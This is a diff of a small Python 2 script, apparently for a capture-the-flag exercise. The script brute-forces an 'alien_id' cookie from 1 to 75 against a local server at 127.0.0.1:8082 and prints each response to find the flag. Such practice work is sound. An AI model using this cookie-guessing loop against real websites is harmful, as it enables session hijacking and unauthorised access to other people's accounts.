@@ -1,22 +1,36 @@
+#
+# Write a script that can guess cookie values
+# and send them to the url http://127.0.0.1:8082/cookiestore
+# Read the response from the right cookie value to get the flag.
+# The cookie id the aliens are using is alien_id
+# we believe the id is a number between 1 and 75
+#
+# Note: The script can timeout if this occurs try narrowing
+# down your search
+#
 import urllib2
 import urllib
-import cookielib
+from cookielib import CookieJar
+
 
 ids = []
 for i in range(75):
     ids.append(i+1)
 url = 'http://127.0.0.1:8082/cookiestore'
-#print ids
+print ids
 
-
+"""
 for thing in ids:
-    cookie_jar = cookielib.CookieJar()
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
-    urllib2.install_opener(opener)
-    data = {'alien-id' : thing}
-    data = urllib.urlencode(data)
-    request = urllib2.Request(url, data)
-    urllib2.urlopen(request)
-
-    for cookie in cookie_jar:
-            print cookie
+    opener = urllib2.build_opener()
+    opener.addheaders.append(('Cookie', 'alien_id'=str(thing)))
+    f = opener.open(url)
+    x = f.read()
+    print(x)
+"""
+for thing in ids:
+    cookiething = 'alien_id=' + str(thing)
+    opener = urllib2.build_opener()
+    opener.addheaders.append(('Cookie', cookiething))
+    f = opener.open(url)
+    x = f.read()
+    print(x)
